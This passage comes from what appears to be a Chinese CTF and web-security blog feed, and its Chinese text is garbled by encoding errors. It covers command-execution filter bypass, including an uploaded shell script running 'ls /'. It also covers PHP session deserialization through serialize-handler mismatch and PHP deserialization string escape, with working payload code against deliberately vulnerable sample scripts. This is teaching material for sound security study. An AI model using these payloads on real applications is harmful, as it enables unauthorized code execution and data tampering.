1</span><br><span class="hljs-comment">Content-Length: 115</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">----------123</span><br><span class="hljs-comment">Content-Disposition:form-data;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment">ls /     //è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span><br><span class="hljs-comment">----------123--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h3 id="3-è¿‡æ»¤äº†-amp"><a href="#3-è¿‡æ»¤äº†-amp" class="headerlink" title="3.è¿‡æ»¤äº†~^|;`&amp;"></a><strong>3.è¿‡æ»¤äº†~^|;`&amp;</strong></h3><p>è¿™ä¸ªæ—¶å€™è¦ç”¨åˆ°è‡ªå¢ å’ŒçŸ­æ ‡ç­¾ç»“åˆèµ·æ¥çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">32</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">127</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)))&#123;   <span class="hljs-comment">//è¿™ä¸ªæ­£åˆ™çœ‹é¢˜ç›®æ˜¯ä»€ä¹ˆ</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>).<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>&#125;<br>?    å¯ä»¥çœ‹çœ‹æ²¡æœ‰è¿‡æ»¤å“ªäº›<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sessionååºåˆ—åŒ–</title>
    <link href="/2023/08/23/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/08/23/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Sessionååºåˆ—åŒ–"><a href="#Sessionååºåˆ—åŒ–" class="headerlink" title="Sessionååºåˆ—åŒ–"></a>Sessionååºåˆ—åŒ–</h1><p>å…·ä½“çš„ä»€ä¹ˆæ˜¯session,php sessionçš„å·¥ä½œæœºåˆ¶æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼š<br><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></p><p>å…ˆæ¥ä»‹ç»ä¸€ä¸‹sessionã€‚sessionæ˜¯å‚¨å­˜åœ¨æœåŠ¡å™¨ç«¯çš„æ•°æ®ï¼Œç›¸å¯¹æ¯”cookieæ¥è®²æ›´åŠ çš„å®‰å…¨ï¼Œå› ä¸ºcookieæ˜¯å‚¨å­˜åœ¨å®¢æˆ·ç«¯çš„æ•°æ®ã€‚</p><p>â€‹                                              å…ˆæ¥çœ‹ä¸€ä¸‹å‡ ä¸ªå‚æ•°çš„å«ä¹‰:</p><table><thead><tr><th>Directive</th><th></th></tr></thead><tbody><tr><td>session.save_handler</td><td>sessionä¿å­˜å½¢å¼ï¼Œé»˜è®¤ä¸ºfiles</td></tr><tr><td>session.save_path</td><td>sessionä¿å­˜è·¯å¾„</td></tr><tr><td>session.serialize_handler</td><td>sessionåºåˆ—åŒ–å­˜å‚¨æ‰€ç”¨å¤„ç†å™¨ï¼Œé»˜è®¤ä¸ºphp</td></tr><tr><td>session.upload_progress.cleanup</td><td>ä¸€æ—¦è¯»å–äº†æ‰€æœ‰çš„POSTæ•°æ®ï¼Œç«‹å³æ¸…é™¤è¿›åº¦ä¿¡æ¯ã€‚é»˜è®¤å¼€å¯</td></tr><tr><td>session.upload_progress.enabled</td><td>å°†ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦ä¿¡æ¯å­˜åœ¨sessionä¸­ï¼Œé»˜è®¤å¼€å¯</td></tr></tbody></table><p>sessionååºåˆ—æ¼æ´äº§ç”Ÿçš„åŸå› å°±æ˜¯å†™å…¥å’Œè¯»å–çš„å†…å®¹ä¸ä¸€æ ·  (å°±æ˜¯ä½¿ç”¨äº†ä¸åŒçš„å¤„ç†å™¨)</p><p>åœ¨phpä¸­sessionæœ‰ä¸‰ç§ååºåˆ—åŒ–çš„æœºåˆ¶ï¼Œåˆ†åˆ«æ˜¯</p><p><strong>1.php 2.php_serialize 3.php_binary</strong></p><p>å®ƒä»¬çš„åºåˆ—åŒ–çš„ç»“æœæ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸‹é¢åˆ†åˆ«ä»‹ç»ä¸€ä¸‹ã€‚</p><p>1.php â€”â€”&gt;é”®åï¼‹ç«–çº¿ï¼‹ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–ä¹‹åçš„å€¼</p><p>2.php_serialize â€”â€”&gt; ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„æ•°ç»„   ä½¿ç”¨è¿™ä¸ªphpç‰ˆæœ¬éœ€è¦å¤§äº5.5.4</p><p>3.php_binary â€”â€”&gt;  é”®åé•¿åº¦å¯¹åº”çš„ASCIIç ï¼‹é”®åï¼‹ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å€¼  </p><p>æ¯”å¦‚è¯´ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[name]=<span class="hljs-string">&#x27;jj&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>1.php  â€”â€”&gt;name|s:2:â€jjâ€;</p><p>2.php_serialzie â€”â€”&gt;a:1:{s:4:â€nameâ€;s:2:â€jjâ€;}</p><p>3.php_binary â€”â€”&gt; EOTnames:2:â€jjâ€;</p><p>ä¸‹é¢ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥è¯´æ˜ä¸€ä¸‹sessionååºåˆ—åŒ–çš„åº”ç”¨</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*hint.php*/</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;her=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name===<span class="hljs-variable language_">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œé¢hint.phpä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨index.phpä¸­ æ²¡æœ‰å¯ä»¥è¾“å…¥çš„ç‚¹ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªsession_start(),å¯ä»¥å¯¹sessionè¿›è¡Œä¸€ä¸ªè¯»å–</p><p>ç„¶ååœ¨hint.phpä¸­æ˜¯ä¸€ä¸ªå†™å…¥sessionçš„ï¼Œè¿™é‡Œå†™å…¥ä½¿ç”¨äº†php_serialize è¯»å–ä½¿ç”¨äº†php</p><p>æ ¹æ®å®ƒä»¬å¯¹sessionåºåˆ—åŒ–çš„ä¸åŒï¼Œå¯ä»¥æ„é€ æ¶æ„çš„ä»£ç ï¼Œä»è€Œå»è·å¾—flag</p><p>æ—¢ç„¶è¯»å–æ˜¯phpï¼Œå®ƒä¼šå°†|åé¢çš„å†…å®¹è¿›è¡Œä¸€ä¸ªååºåˆ—åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–å¥½çš„å­—ç¬¦ä¸²å‰é¢åŠ ä¸Šä¸€ä¸ª|</p><p>é‚£ä¹ˆæ¥çœ‹è¿™ä¸ªç®€å•çš„Flagç±»ï¼Œè¿™é‡Œåˆ©ç”¨äº†å¼•ç”¨ï¼Œå°±æ˜¯åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸¤ä¸ªå€¼ä¸åŒä½†è·å–flagçš„å‰ææ˜¯ä¸¤ä¸ªå€¼ç›¸åŒ</p><p>æ‰€ä»¥å¯ä»¥æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;name=&amp;<span class="hljs-variable">$a</span>-&gt;her;<br><span class="hljs-keyword">echo</span>  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="æ²¡æœ‰-SESSIONå˜é‡èµ‹å€¼çš„æƒ…å†µ"><a href="#æ²¡æœ‰-SESSIONå˜é‡èµ‹å€¼çš„æƒ…å†µ" class="headerlink" title="æ²¡æœ‰$_SESSIONå˜é‡èµ‹å€¼çš„æƒ…å†µ"></a>æ²¡æœ‰$_SESSIONå˜é‡èµ‹å€¼çš„æƒ…å†µ</h1><p>å½“session.upload_progress.enable å¼€å¯æ—¶ï¼Œå½“ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œä¼šå¯¹æ–‡ä»¶ä¸Šä¼ è¿›åº¦è¿›è¡Œä¸€ä¸ªç›‘æµ‹ã€‚</p><p>å®˜æ–¹æ¥è®²å°±æ˜¯ï¼šå½“ <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a> INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€ã€‚</p><p>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>åŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>ä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>ä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a> ä¸ <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>è¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚</p><p>ç®€å•çš„æ¥è®²å°±æ˜¯æ„é€ ä¸€ä¸ªä¸Šä¼ è¡¨å•ï¼Œç„¶åæŠ“åŒ…ï¼Œå¯¹æ–‡ä»¶åè¿›è¡Œä¸€ä¸ªä¿®æ”¹</p><p>è¡¨å•ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;form action=<span class="hljs-string">&quot;http://example&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>; <span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot; value=&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;</span>file<span class="hljs-string">&quot; name=&quot;</span>file<span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;</span>submit<span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼š</p><p><a href="https://www.cnblogs.com/yokan/p/12575371.html">https://www.cnblogs.com/yokan/p/12575371.html</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phpååºåˆ—åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpååºåˆ—åŒ–é€ƒé€¸</title>
    <link href="/2023/08/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/"/>
    <url>/2023/08/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰å°±å¯¹å­—ç¬¦ä¸²é€ƒé€¸è¿™ä¸€å—ç†è§£çš„ä¸æ˜¯å¾ˆæ·±åˆ»ï¼Œä¸‹é¢é€šè¿‡ä¸€ä½å¸ˆå‚…çš„åšå®¢æ¥è¿›ä¸€æ­¥æ·±å…¥ç†è§£ä¸€ä¸‹æœ‰å…³phpå­—ç¬¦ä¸²é€ƒé€¸çš„ç›¸å…³å†…å®¹ã€‚</p><p>è´´ä¸Šå¸ˆå‚…çš„åšå®¢åœ°å€:<a href="https://blog.csdn.net/qq_45521281/article/details/107135706">https://blog.csdn.net/qq_45521281/article/details/107135706</a></p><p><strong>å…ˆæ¥è¯´ä¸€ä¸‹ä»€ä¹ˆæ˜¯å­—ç¬¦ä¸²é€ƒé€¸ï¼Œå°±æ˜¯æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€äº›æ¶æ„ä»£ç ï¼Œè®©å…¶åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æ‰§è¡Œæˆ‘ä»¬æƒ³è®©å®ƒæ‰§è¡Œçš„ã€‚åœ¨è¿™è¿‡ç¨‹ä¸­é€ æˆçš„å­—ç¬¦ä¸²çš„å¢åŠ æˆ–è€…å‡å°‘ç§°ä¸ºå­—ç¬¦ä¸²é€ƒé€¸ã€‚</strong></p><h1 id="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å¢åŠ -é€ƒé€¸å¢åŠ "><a href="#æ›¿æ¢ä¿®æ”¹åå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å¢åŠ -é€ƒé€¸å¢åŠ " class="headerlink" title="æ›¿æ¢ä¿®æ”¹åå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å¢åŠ    (é€ƒé€¸å¢åŠ )"></a>æ›¿æ¢ä¿®æ”¹åå¯¼è‡´å­—ç¬¦ä¸²é•¿åº¦å¢åŠ    (é€ƒé€¸å¢åŠ )</h1><p>å…ˆæ¥ä¸€ä¸ªä»£ç ç®€å•çš„åˆ†æä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<br><span class="hljs-meta">?&gt;</span><br>    çœ‹å®ƒçš„è¿”å›ç»“æœï¼š<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;aaaa&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br><span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>è‹¥æˆ‘ä»¬åœ¨ä¸ç›´æ¥ä¿®æ”¹passçš„å‰æä¸‹ï¼Œè®©passçš„å€¼å˜æˆhackerï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•å®ç°å‘¢ï¼Ÿ<br>è¿™é‡Œæˆ‘ä»¬å°±ç”¨åˆ°äº†å­—ç¬¦ä¸²é€ƒé€¸å¢åŠ æ¥å®ç°ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°str_replace(â€˜bbâ€™,â€™cccâ€™,$str); æ„æ€å°±æ˜¯åœ¨å˜é‡strä¸­ï¼Œå°†æ¯ä¸¤ä¸ªbæ›¿æ¢æˆä¸‰ä¸ªcï¼Œä½†åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦é•¿åº¦ä»ç„¶æŒ‰ç…§æ²¡æœ‰è¢«æ›¿æ¢çš„ã€‚</p><p>ä¸¾ä¸ªä¾‹å­è¯´æ˜ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;aaaabb&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br><span class="hljs-meta">?&gt;</span><br>    è¿è¡Œçš„ç»“æœå¦‚ä¸‹ï¼š<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;aaaabb&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;aaaaccc&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;&#125;  <span class="hljs-comment">//è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°aaaacccæ˜æ˜æ˜¯7ä¸ªå­—ç¬¦ï¼Œä½†å‰é¢æ ‡çš„ä»ç„¶æ˜¯6ä¸ªï¼Œè¿™é‡Œå°±é€ƒé€¸å‡ºæ¥ä¸€ä¸ªå­—ç¬¦ã€‚</span><br></code></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢çš„æ¼”ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œæ„é€ ä»£ç ï¼Œé€šè¿‡bbæ›¿æ¢æˆcccï¼Œæ¥è¿›è¡Œå­—ç¬¦ä¸²çš„é€ƒé€¸ï¼Œä»è€Œè®©passçš„å€¼ä¸ºhacker</p><p>ä¸‹é¢æ˜¯ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;bb&#x27;</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;123456&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$AA</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$AA</span>));<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>-&gt;pass;<br><span class="hljs-comment">//echo $res;</span><br><span class="hljs-meta">?&gt;</span><br>    è¿è¡Œçš„ç»“æœï¼š<br>O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">81</span>:<span class="hljs-string">&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;pass&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;<span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">hacker</span><br><span class="hljs-string">æˆåŠŸçš„å®ç°ç›®æ 